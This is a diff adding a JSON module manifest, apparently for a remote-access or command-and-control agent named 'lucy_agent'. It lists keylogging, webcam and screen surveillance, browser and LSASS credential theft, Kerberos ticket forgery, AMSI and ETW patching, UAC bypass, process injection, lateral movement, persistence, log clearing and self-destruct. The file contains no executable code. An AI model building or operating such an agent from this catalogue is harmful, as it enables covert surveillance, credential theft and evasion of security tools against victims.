@@ -1,0 +1,371 @@
+{
+  "info": {
+    "category": "recon",
+    "actions": ["run"],
+    "tags": ["system", "metadata"],
+    "expected_duration": 10,
+    "params_schema": {
+      "type": "object",
+      "properties": {}
+    }
+  },
+  "shell": {
+    "category": "execution",
+    "actions": ["exec"],
+    "tags": ["shell", "command"],
+    "expected_duration": 30,
+    "params_schema": {
+      "type": "object",
+      "properties": {
+        "cmd": { "type": "string", "default": "whoami" },
+        "timeout": { "type": "integer", "default": 30 }
+      }
+    }
+  },
+  "file": {
+    "category": "file",
+    "actions": ["list", "read", "write", "delete", "search", "tree", "exfil", "upload", "download", "stat"],
+    "tags": ["file", "exfil"],
+    "expected_duration": 60,
+    "params_schema": {
+      "type": "object",
+      "properties": {
+        "path": { "type": "string", "default": "" },
+        "pattern": { "type": "string", "default": "*.txt" },
+        "recursive": { "type": "boolean", "default": true }
+      }
+    }
+  },
+  "screenshot": {
+    "category": "surveillance",
+    "actions": ["capture", "stream_start", "stream_stop"],
+    "tags": ["visual", "screen"],
+    "expected_duration": 20,
+    "params_schema": {
+      "type": "object",
+      "properties": {
+        "quality": { "type": "integer", "default": 70 },
+        "width": { "type": "integer" },
+        "height": { "type": "integer" }
+      }
+    }
+  },
+  "keylog": {
+    "category": "surveillance",
+    "actions": ["start", "stop", "dump"],
+    "tags": ["keystrokes", "credentials"],
+    "expected_duration": 300,
+    "params_schema": {
+      "type": "object",
+      "properties": {
+        "duration": { "type": "integer", "default": 60 },
+        "flush_interval": { "type": "integer", "default": 30 }
+      }
+    }
+  },
+  "browser": {
+    "category": "credentials",
+    "actions": ["steal", "history", "cookies", "passwords"],
+    "tags": ["browser", "credentials"],
+    "expected_duration": 90,
+    "params_schema": {
+      "type": "object",
+      "properties": {
+        "browsers": { "type": "array", "default": ["chrome", "firefox", "edge"] },
+        "limit": { "type": "integer", "default": 500 }
+      }
+    }
+  },
+  "builtin": {
+    "category": "full",
+    "actions": ["run", "processes", "users", "groups", "services", "netinfo", "netstat", "arp", "shares", "persist", "clear_logs", "env_secrets", "ssh_keys", "credential_manager"],
+    "tags": ["builtin", "utility"],
+    "expected_duration": 30,
+    "params_schema": {
+      "type": "object",
+      "properties": {}
+    }
+  },
+  "port_scan": {
+    "category": "recon",
+    "actions": ["scan", "subnet"],
+    "tags": ["network", "scan"],
+    "expected_duration": 120,
+    "params_schema": {
+      "type": "object",
+      "properties": {
+        "host": { "type": "string", "default": "127.0.0.1" },
+        "ports": { "type": "array", "default": [22, 80, 443] },
+        "cidr": { "type": "string", "default": "192.168.1.0/24" },
+        "timeout": { "type": "number", "default": 1 }
+      }
+    }
+  },
+  "wifi": {
+    "category": "recon",
+    "actions": ["scan", "credentials"],
+    "tags": ["wifi", "network"],
+    "expected_duration": 30,
+    "params_schema": {
+      "type": "object",
+      "properties": {}
+    }
+  },
+  "webcam": {
+    "category": "surveillance",
+    "actions": ["capture", "burst", "list"],
+    "tags": ["webcam", "visual"],
+    "expected_duration": 30,
+    "params_schema": {
+      "type": "object",
+      "properties": {
+        "duration": { "type": "integer", "default": 5 }
+      }
+    }
+  },
+  "clipboard": {
+    "category": "credentials",
+    "actions": ["capture", "set", "monitor"],
+    "tags": ["clipboard", "data"],
+    "expected_duration": 10,
+    "params_schema": {
+      "type": "object",
+      "properties": {}
+    }
+  },
+  "credential_dump": {
+    "category": "credentials",
+    "actions": ["lsass", "registry", "dpapi", "kerberos"],
+    "tags": ["credentials", "dump"],
+    "expected_duration": 60,
+    "params_schema": {
+      "type": "object",
+      "properties": {}
+    }
+  },
+  "persistence": {
+    "category": "persistence",
+    "actions": ["install", "remove", "check"],
+    "tags": ["persistence", "startup"],
+    "expected_duration": 15,
+    "params_schema": {
+      "type": "object",
+      "properties": {
+        "method": { "type": "string", "default": "auto" },
+        "name": { "type": "string", "default": "lucy_agent" }
+      }
+    }
+  },
+  "anti_analysis": {
+    "category": "evasion",
+    "actions": ["check", "evade"],
+    "tags": ["evasion", "sandbox"],
+    "expected_duration": 15,
+    "params_schema": {
+      "type": "object",
+      "properties": {
+        "abort_on_detected": { "type": "boolean", "default": true }
+      }
+    }
+  },
+  "remote_control": {
+    "category": "control",
+    "actions": ["screenshot", "mouse_move", "mouse_click", "mouse_scroll", "mouse_drag", "key_press", "key_type", "hotkey", "clipboard_get", "clipboard_set"],
+    "tags": ["remote", "control"],
+    "expected_duration": 30,
+    "params_schema": {
+      "type": "object",
+      "properties": {}
+    }
+  },
+  "stealth": {
+    "category": "evasion",
+    "actions": ["indicators", "status", "check", "self_destruct"],
+    "tags": ["stealth", "evasion", "self-destruct"],
+    "expected_duration": 10,
+    "params_schema": {
+      "type": "object",
+      "properties": {
+        "delay": { "type": "integer", "default": 0 }
+      }
+    }
+  },
+  "process": {
+    "category": "recon",
+    "actions": ["list", "kill", "info"],
+    "tags": ["process", "recon"],
+    "expected_duration": 10,
+    "params_schema": {
+      "type": "object",
+      "properties": {
+        "pid": { "type": "integer" },
+        "name": { "type": "string" }
+      }
+    }
+  },
+  "screen_stream": {
+    "category": "surveillance",
+    "actions": ["frame", "start", "stop", "info"],
+    "tags": ["screen", "stream"],
+    "expected_duration": 30,
+    "params_schema": {
+      "type": "object",
+      "properties": {
+        "fps": { "type": "integer", "default": 10 },
+        "quality": { "type": "integer", "default": 60 }
+      }
+    }
+  },
+  "geoip": {
+    "category": "recon",
+    "actions": ["lookup"],
+    "tags": ["geo", "ip"],
+    "expected_duration": 5,
+    "params_schema": {
+      "type": "object",
+      "properties": {
+        "ip": { "type": "string" }
+      }
+    }
+  },
+  "injection": {
+    "category": "execution",
+    "actions": ["dll_inject", "shellcode_inject", "shellcode_execute", "process_hollow", "migrate", "list_processes", "get_pid"],
+    "tags": ["injection", "execution"],
+    "expected_duration": 30,
+    "params_schema": {
+      "type": "object",
+      "properties": {}
+    }
+  },
+  "edr_evasion": {
+    "category": "evasion",
+    "actions": ["patch_amsi", "patch_etw", "unhook_ntdll", "restore_amsi", "status", "check_hooks"],
+    "tags": ["edr", "evasion"],
+    "expected_duration": 15,
+    "params_schema": {
+      "type": "object",
+      "properties": {}
+    }
+  },
+  "lateral": {
+    "category": "lateral",
+    "actions": ["psexec", "wmi_exec", "winrm", "dcom", "sc_remote", "copy_share", "pass_the_hash_wmi", "enumerate_shares", "enumerate_sessions"],
+    "tags": ["lateral", "movement"],
+    "expected_duration": 60,
+    "params_schema": {
+      "type": "object",
+      "properties": {}
+    }
+  },
+  "token": {
+    "category": "credentials",
+    "actions": ["make_token", "steal_token", "get_uid", "rev_to_self", "list_tokens", "make_token_hash", "get_privileges", "enable_privilege"],
+    "tags": ["token", "impersonation"],
+    "expected_duration": 10,
+    "params_schema": {
+      "type": "object",
+      "properties": {}
+    }
+  },
+  "pth": {
+    "category": "credentials",
+    "actions": ["pass_the_hash", "pass_the_ticket", "dump_tickets", "request_ticket", "golden_ticket", "silver_ticket", "ptt_powershell"],
+    "tags": ["pth", "credentials"],
+    "expected_duration": 30,
+    "params_schema": {
+      "type": "object",
+      "properties": {}
+    }
+  },
+  "kerberoast": {
+    "category": "credentials",
+    "actions": ["kerberoast", "asrep", "tickets"],
+    "tags": ["kerberoast", "credentials"],
+    "expected_duration": 60,
+    "params_schema": {
+      "type": "object",
+      "properties": {}
+    }
+  },
+  "uac_bypass": {
+    "category": "evasion",
+    "actions": ["fodhelper", "sdclt", "computerdefaults", "fodhelper_dll", "check_uac", "auto", "cleanup"],
+    "tags": ["uac", "bypass"],
+    "expected_duration": 15,
+    "params_schema": {
+      "type": "object",
+      "properties": {}
+    }
+  },
+  "pivoting": {
+    "category": "network",
+    "actions": ["start", "stop", "status"],
+    "tags": ["pivoting", "network"],
+    "expected_duration": 30,
+    "params_schema": {
+      "type": "object",
+      "properties": {}
+    }
+  },
+  "sleep_mask": {
+    "category": "evasion",
+    "actions": ["enable", "disable", "status", "encrypt_region", "test"],
+    "tags": ["sleep", "evasion"],
+    "expected_duration": 10,
+    "params_schema": {
+      "type": "object",
+      "properties": {}
+    }
+  },
+  "syscalls": {
+    "category": "evasion",
+    "actions": ["resolve", "call", "list", "check"],
+    "tags": ["syscalls", "evasion"],
+    "expected_duration": 10,
+    "params_schema": {
+      "type": "object",
+      "properties": {}
+    }
+  },
+  "tls_fingerprint": {
+    "category": "evasion",
+    "actions": ["set_ja3", "set_profile", "get_current", "test", "apply_to_agent"],
+    "tags": ["tls", "fingerprint"],
+    "expected_duration": 10,
+    "params_schema": {
+      "type": "object",
+      "properties": {}
+    }
+  },
+  "macos": {
+    "category": "credentials",
+    "actions": ["keychain_dump", "keychain_extract", "tcc_check", "launchagent_persist", "launchdaemon_persist", "browser_cookies", "screenshot_dir"],
+    "tags": ["macos", "credentials"],
+    "expected_duration": 30,
+    "params_schema": {
+      "type": "object",
+      "properties": {}
+    }
+  },
+  "bof": {
+    "category": "execution",
+    "actions": ["execute", "list_exports", "beacon_api"],
+    "tags": ["bof", "execution"],
+    "expected_duration": 15,
+    "params_schema": {
+      "type": "object",
+      "properties": {}
+    }
+  },
+  "persistence_adv": {
+    "category": "persistence",
+    "actions": ["install_service", "remove_service", "wmi_subscription", "remove_wmi_subscription", "com_hijack", "remove_com_hijack", "dll_hijack", "remove_dll_hijack", "registry_runonce", "registry_runservices", "scheduled_task_trigger", "list_persistence", "cleanup_all"],
+    "tags": ["persistence", "advanced"],
+    "expected_duration": 30,
+    "params_schema": {
+      "type": "object",
+      "properties": {}
+    }
+  }
+}
